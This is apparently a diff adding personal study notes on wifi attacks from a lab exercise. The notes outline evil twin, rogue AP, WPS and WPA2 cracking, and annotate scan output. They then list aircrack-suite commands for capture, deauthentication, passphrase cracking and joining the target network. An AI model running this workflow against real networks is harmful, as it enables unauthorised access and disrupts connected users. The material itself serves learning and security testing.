@@ -1,0 +1,80 @@
+
+Basic wifi attack techniques:
+  Evil twin: Start access point with similar name to target access point, then spam
+  de-authentication packets towards all users connected to the target AP. Given enough
+  frustration, users may try to authenticate to your access point instead.
+
+  Rogue AP: Similar to evil twin, but without actively de-authenticating users.
+
+  WPS attack: Initiates the WPS handshake, but captures the router's response to
+  brute-force the PIN and Pre-Shared Key (PSK)
+
+  WPA/WPA2 cracking: Either waits on a client to connect to sniff the 4-way handshake
+  or de-authenticates a connected client to force the handshake to reoccur. After
+  sniffing the handshake, the PSK can be cracked with standard cracking techniques.
+
+
+Show network interfaces:
+  iw dev
+
+Analyzing Response:
+  phy#2                       - 
+    Interface wlan2           - 
+      ifindex 5               - 
+      wdev 0x200000001        - 
+      addr 02:00:00:00:02:00  - MAC/BSSID (Basic Service Set Identifier)
+      type managed            - managed is the standard mode for "clients" 
+      txpower 20.00 dBm       - 
+
+
+Scan for networks:
+  sudo iw dev [INTERFACE] scan
+        
+Analyzing Response:
+
+  BSS 02:00:00:00:00:00(on wlan2)                               - BSSID
+    last seen: 3770.600s [boottime]                             - 
+    TSF: 1733971566208038 usec (20069d, 02:46:06)               - 
+    freq: 2437                                                  - 
+    beacon interval: 100 TUs                                    - 
+    capability: ESS Privacy ShortSlotTime (0x0411)              - 
+    signal: -30.00 dBm                                          - 
+    last seen: 0 ms ago                                         - 
+    Information elements from Probe Response frame:             - 
+    SSID: MalwareM_AP                                           - SSID
+    Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0     - 
+    DS Parameter set: channel 6                                 - common channels in 2.4GHz range are 1, 6, 11
+    ERP: Barker_Preamble_Mode                                   - 
+    Extended supported rates: 24.0 36.0 48.0 54.0               - 
+    RSN:	 * Version: 1                                         - Robust Security Network (WPA2)
+      * Group cipher: CCMP                                      - CCMP (CBCMAC) Group Cipher
+      * Pairwise ciphers: CCMP                                  - CCMP Pairwise Cipher (standard for WPA2)
+      * Authentication suites: PSK                              - PSK implies a personal network/uses password auth
+      * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)            - 
+    Supported operating classes:                                - 
+      * current operating class: 81                             - 
+    Extended capabilities:                                      - 
+      * Extended Channel Switching                              - 
+      * Operating Mode Notification                             - 
+
+Monitor mode: 
+  Listens to all traffic on a channel, whether intended for the device or not (promiscuous mode?)
+
+  Check if monitor mode is available:
+    sudo ip link set dev [INTERFACE] down
+    sudo iw dev [INTERFACE] set type monitor
+    sudo ip link set dev [INTERFACE] up
+
+  Run airodump:
+    sudo airodump-ng [INTERFACE]
+    sudo airodump-ng -c [DS PARAMETER CHANNEL] --bssid [BSSID] -w [OUTFILE] [INTERFACE]
+
+  Deauthentication attack:
+    sudo aireplay-ng -0 [# OF DEAUTH PACKETS] -a [ACCESS PT BSSID] -c [CLIENT BSSID] [INTERFACE]
+
+  Cracking the passphrase:
+    sudo aircrack-ng -a [ATTACK MODE] -b [ACCESS PT BSSID] -w [WORDLIST] output*cap
+
+  Joining the network:
+    wpa_passphrase MalwareM_AP '[PSK]' > [CONFIGFILE]
+    sudo wpa_supplicant -B -c [CONFIGFILE] -i wlan2
